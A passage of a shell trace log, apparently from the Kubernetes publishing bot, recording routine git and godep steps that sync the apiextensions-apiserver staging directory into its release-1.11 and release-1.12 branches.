SUBDIR=staging/src/k8s.io/apiextensions-apiserver\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=cd6e3aed88a18b65cebe65e2e577455b0352ccf5\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q f584b16eb23bd2a3fd292a027d698d95db427c5d\n>\t+ git branch -D release-1.11\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.11\n>\tSwitching to origin/release-1.11.\n>\t+ echo 'Switching to origin/release-1.11.'\n>\t+ git branch -f release-1.11 origin/release-1.11\n>\t+ git checkout -q release-1.11\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.11\n>\tSkipping sync because upstream/release-1.11 at cd6e3aed88a18b65cebe65e2e577455b0352ccf5 did not change since last sync.\n>\t+ UPSTREAM_HASH=cd6e3aed88a18b65cebe65e2e577455b0352ccf5\n>\t+ '[' cd6e3aed88a18b65cebe65e2e577455b0352ccf5 '!=' cd6e3aed88a18b65cebe65e2e577455b0352ccf5 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.11 at cd6e3aed88a18b65cebe65e2e577455b0352ccf5 did not change since last sync.'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.11\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=16750353bf974758fbed9f44c39b81dfe6decb71\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-apiextensions-apiserver-release-1.11.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-apiextensions-apiserver-release-1.11.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.11 --push-script ../push-tags-apiextensions-apiserver-release-1.11.sh --dependencies apimachinery:release-1.11,api:release-1.11,client-go:release-8.0,apiserver:release-1.11,code-generator:release-1.11 --mapping-output-file '../tag-apiextensions-apiserver-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.11\n>\t+ '[' 16750353bf974758fbed9f44c39b81dfe6decb71 '!=' 16750353bf974758fbed9f44c39b81dfe6decb71 ']'\n>\t+ git checkout release-1.11\n>\tAlready on 'release-1.11'\n>\tYour branch is up-to-date with 'origin/release-1.11'.\n>[05 Oct 18 01:15 UTC]: Successfully constructed release-1.11\n>[05 Oct 18 01:15 UTC]: /publish_scripts/construct.sh apiextensions-apiserver release-1.12 release-1.12 apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiserver:release-1.12,code-generator:release-1.12 k8s.io/code-generator /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/apiextensions-apiserver kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  54a352dda957bce0f88e49b65a6ee8bba8c0ba74\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=apiextensions-apiserver\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiserver:release-1.12,code-generator:release-1.12\n>\t+ REQUIRED=k8s.io/code-generator\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/apiextensions-apiserver\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=54a352dda957bce0f88e49b65a6ee8bba8c0ba74\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 16750353bf974758fbed9f44c39b81dfe6decb71\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=32f187bc1c6df52008a2152e32650cbf7e674a68\n>\t+ '[' 32f187bc1c6df52008a2152e32650cbf7e674a68 '!=' 54a352dda957bce0f88e49b65a6ee8bba8c0ba74 ']'\n>\t+ echo 'Upstream branch upstream/release-1.12 moved from '\\''54a352dda957bce0f88e49b65a6ee8bba8c0ba74'\\'' to '\\''32f187bc1c6df52008a2152e32650cbf7e674a68'\\''. We have to sync.'\n>\tUpstream branch upstream/release-1.12 moved from '54a352dda957bce0f88e49b65a6ee8bba8c0ba74' to '32f187bc1c6df52008a2152e32650cbf7e674a68'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/apiextensions-apiserver release-1.12 release-1.12 apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiserver:release-1.12,code-generator:release-1.12 k8s.io/code-generator k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/apiextensions-apiserver\n>\t+ local src_branch=release-1.12\n>\t+ local dst_branch=release-1.12\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiserver:release-1.12,code-generator:release-1.12\n>\t+ local required_packages=k8s.io/code-generator\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\tca1024863b48cf0701229109df75ac5f0bb4907e\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 14 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing release-1.12 commit ca1024863b48cf0701229109df75ac5f0bb4907e.\n>\t+ echo 'Starting at existing release-1.12 commit ca1024863b48cf0701229109df75ac5f0bb4907e.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.12\n>\tBranch upstream-branch set up to track remote branch release-1.12 from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 32f187bc1c6df52008a2152e32650cbf7e674a68.\n>\t+ echo 'Checked out source commit 32f187bc1c6df52008a2152e32650cbf7e674a68.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-1.12\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-1.12\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ true\n>\t+ local k_base_commit=a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33\n>\t+ '[' -z a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33 ']'\n>\t++ git-find-merge a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33 upstream/release-1.12\n>\t++ tail -1\n>\t+++ git rev-list 'a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33^1..upstream/release-1.12' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33..upstream/release-1.12 --ancestry-path\n>\t+++ git rev-parse a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33\n>\t+ local k_base_merge=a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33\n>\t+ '[' -z a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33 ']'\n>\t+ git branch -f filtered-branch-base a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33\n>\tRewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/apiextensions-apiserver.\n>\t+ echo 'Rewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/apiextensions-apiserver.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/apiextensions-apiserver 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/apiextensions-apiserver\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\tRunning git filter-branch ...\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/apiextensions-apiserver -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=816aa754a5182fc1b8a7c76e8a7004b2507a6be9\n>\t++ git log --first-parent --format=%H --reverse 816aa754a5182fc1b8a7c76e8a7004b2507a6be9..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-1.12.'\n>\tChecking out branch release-1.12.\n>\t+ git checkout -q release-1.12\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=ca1024863b48cf0701229109df75ac5f0bb4907e\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\tFixing up godeps after a complete sync\n>\t+ local dst_merge_point_commit=ca1024863b48cf0701229109df75ac5f0bb4907e\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\t+ '[' ca1024863b48cf0701229109df75ac5f0bb4907e '!=' ca1024863b48cf0701229109df75ac5f0bb4907e ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiserver:release-1.12,code-generator:release-1.12 k8s.io/code-generator k8s.io false true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiserver:release-1.12,code-generator:release-1.12\n>\t+ local required_packages=k8s.io/code-generator\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=ca1024863b48cf0701229109df75ac5f0bb4907e\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiserver:release-1.12,code-generator:release-1.12 k8s.io false Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiserver:release-1.12,code-generator:release-1.12\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/apiextensions-apiserver\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ indent-godeps\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiserver/\") or . == \"k8s.io/apiserver\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiextensions-apiserver/\") or . == \"k8s.io/apiextensions-apiserver\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiserver:release-1.12,code-generator:release-1.12\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33\n>\t+ '[' -z a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33 ']'\n>\t++ git-find-merge a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33 upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33^1..upstream-branch' --first-parent\n>\t+++ git rev-list a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33..upstream-branch --ancestry-path\n>\t+++ git rev-parse a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33\n>\t+ local k_last_kube_merge=a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33\n>\t+ local dep_count=5\n>\t+ (( i=0 ))\n>\t+ (( i<5 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33.\n>\t+ read k_commit dep_commit\n>\t++ look -b a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33 ../kube-commits-apimachinery-release-1.12\n>\t+ '[' -z 6dd46049f39503a1fc8d65de4bd566829e95faff ']'\n>\t+ pushd ../apimachinery\n>\tChecking out k8s.io/apimachinery to 6dd46049f39503a1fc8d65de4bd566829e95faff\n>\t+ echo 'Checking out k8s.io/apimachinery to 6dd46049f39503a1fc8d65de4bd566829e95faff'\n>\t+ git checkout -q 6dd46049f39503a1fc8d65de4bd566829e95faff\n>\tLooking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33.\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<5 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33 ../kube-commits-api-release-1.12\n>\tChecking out k8s.io/api to 8b2bf3fd233a3ac3873005b3b70ecce09065fddc\n>\t+ '[' -z 8b2bf3fd233a3ac3873005b3b70ecce09065fddc ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 8b2bf3fd233a3ac3873005b3b70ecce09065fddc'\n>\t+ git checkout -q 8b2bf3fd233a3ac3873005b3b70ecce09065fddc\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<5 ))\n>\t+ local dep=client-go\n>\t+ local branch=release-9.0\n>\t+ echo 'Looking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33.'\n>\tLooking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33 ../kube-commits-client-go-release-9.0\n>\t+ '[' -z 173ad5fde8e4ee8f92763f78c6ba37322f2125ab ']'\n>\t+ pushd ../client-go\n>\tChecking out k8s.io/client-go to 173ad5fde8e4ee8f92763f78c6ba37322f2125ab\n>\t+ echo 'Checking out k8s.io/client-go to 173ad5fde8e4ee8f92763f78c6ba37322f2125ab'\n>\t+ git checkout -q 173ad5fde8e4ee8f92763f78c6ba37322f2125ab\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<5 ))\n>\t+ local dep=apiserver\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33.\n>\t+ read k_commit dep_commit\n>\t++ look -b a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33 ../kube-commits-apiserver-release-1.12\n>\t+ '[' -z 3f9daea3953cd4cde09c36c8c509ae8189bd6473 ']'\n>\t+ pushd ../apiserver\n>\t+ echo 'Checking out k8s.io/apiserver to 3f9daea3953cd4cde09c36c8c509ae8189bd6473'\n>\tChecking out k8s.io/apiserver to 3f9daea3953cd4cde09c36c8c509ae8189bd6473\n>\t+ git checkout -q 3f9daea3953cd4cde09c36c8c509ae8189bd6473\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<5 ))\n>\t+ local dep=code-generator\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/code-generator corresponds to k8s.io/kubernetes commit a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-1.12 branch of k8s.io/code-generator corresponds to k8s.io/kubernetes commit a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33.\n>\t++ look -b a5d1aa6c70cff3eaa8feaaee6f0fa4935cbefa33 ../kube-commits-code-generator-release-1.12\n>\t+ '[' -z 3dcf91f64f638563e5106f21f50c31fa361c918d ']'\n>\t+ pushd ../code-generator\n>\t+ echo 'Checking out k8s.io/code-generator to 3dcf91f64f638563e5106f21f50c31fa361c918d'\n>\tChecking out k8s.io/code-generator to 3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ git checkout -q 3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<5 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 1\n>\t+ echo 'Committing vendor/ and Godeps/Godeps.json.'\n>\t+ git commit -q -m 'sync: update godeps'\n>\tCommitting vendor/ and Godeps/Godeps.json.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' false = true ']'\n>\t+ '[' -n k8s.io/code-generator ']'\n>\t+ IFS=,\n>\t+ read -a pkg_array\n>\t+ local pkg_count=1\n>\t+ (( i=0 ))\n>\t+ (( i<1 ))\n>\t+ local pkg=k8s.io/code-generator\n>\t+ rm -rf vendor/k8s.io/code-generator\n>\t+ mkdir -p vendor/k8s.io/code-generator\n>\t+ cp -ax /go-workspace/src/k8s.io/code-generator/CONTRIBUTING.md /go-workspace/src/k8s.io/code-generator/Godeps /go-workspace/src/k8s.io/code-generator/LICENSE /go-workspace/src/k8s.io/code-generator/OWNERS /go-workspace/src/k8s.io/code-generator/README.md /go-workspace/src/k8s.io/code-generator/SECURITY_CONTACTS /go-workspace/src/k8s.io/code-generator/_examples /go-workspace/src/k8s.io/code-generator/cmd /go-workspace/src/k8s.io/code-generator/code-of-conduct.md /go-workspace/src/k8s.io/code-generator/generate-groups.sh /go-workspace/src/k8s.io/code-generator/generate-internal-groups.sh /go-workspace/src/k8s.io/code-generator/hack /go-workspace/src/k8s.io/code-generator/pkg /go-workspace/src/k8s.io/code-generator/third_party /go-workspace/src/k8s.io/code-generator/vendor vendor/k8s.io/code-generator/\n>\t+ (( i++  ))\n>\t+ (( i<1 ))\n>\t+ git add vendor/k8s.io/code-generator\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 1\n>\t+ echo 'Committing vendor/ with required packages: k8s.io/code-generator'\n>\t+ git commit -q -m 'sync: update required packages'\n>\tCommitting vendor/ with required packages: k8s.io/code-generator\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local 